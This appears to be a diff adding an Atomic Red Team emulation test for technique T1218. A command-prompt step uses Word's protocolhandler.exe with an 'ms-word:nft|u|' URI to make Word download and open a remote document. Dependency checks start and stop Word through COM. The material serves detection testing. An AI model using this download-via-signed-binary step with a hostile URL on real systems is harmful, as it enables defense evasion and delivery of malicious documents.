@@ -1,0 +1,86 @@
+{
+  "id": "db020456-125b-4c8b-a4a7-487df8afb5a2",
+  "name": "ProtocolHandler.exe Downloaded a Suspicious File",
+  "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "d678db2a-9baa-4d36-86f0-40f7ff322563",
+      "type": "execute-command",
+      "data": {
+        "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "59dfc72b-a75c-473f-984c-f7b7bd980c75",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "22b17baf-88bc-4e58-933e-0de9bd518889",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "963b135e-340c-487c-9cd3-944b6b7a4101",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "59dfc72b-a75c-473f-984c-f7b7bd980c75",
+      "p": "on-success",
+      "o": "d678db2a-9baa-4d36-86f0-40f7ff322563"
+    },
+    {
+      "s": "59dfc72b-a75c-473f-984c-f7b7bd980c75",
+      "p": "on-failure",
+      "o": "22b17baf-88bc-4e58-933e-0de9bd518889"
+    },
+    {
+      "s": "22b17baf-88bc-4e58-933e-0de9bd518889",
+      "p": "on-success",
+      "o": "963b135e-340c-487c-9cd3-944b6b7a4101"
+    },
+    {
+      "s": "963b135e-340c-487c-9cd3-944b6b7a4101",
+      "p": "on-failure",
+      "o": "d678db2a-9baa-4d36-86f0-40f7ff322563"
+    }
+  ],
+  "tags": [
+    "T1218",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_url",
+      "type": "url",
+      "description": "url to document",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
+    }
+  ]
+}
